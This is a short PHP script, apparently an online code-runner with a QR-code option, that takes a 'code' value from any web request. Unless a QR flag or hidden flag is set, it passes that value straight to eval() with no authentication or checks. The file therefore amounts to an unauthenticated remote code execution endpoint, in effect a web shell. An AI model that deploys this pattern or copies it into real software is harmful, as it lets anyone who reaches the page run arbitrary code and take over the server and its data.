<?php
error_reporting(E_ALL | E_STRICT);
$code = $_REQUEST['code'];
$code = get_magic_quotes_gpc() ? stripslashes($code) : $code;
if (isset($_POST['hidden']) && $_POST['hidden'] == 1) {
    echo $code;
    exit();
} else {
    date_default_timezone_set('PRC');
    // 二维码
    if(isset($_REQUEST['qrcode'])){
    	require 'qrcode/Qrcode.class.php';
    	$qr = new Qrcode();
		$qr->png($code); 
    }else{
    	echo eval($code);
    }
    exit();
}
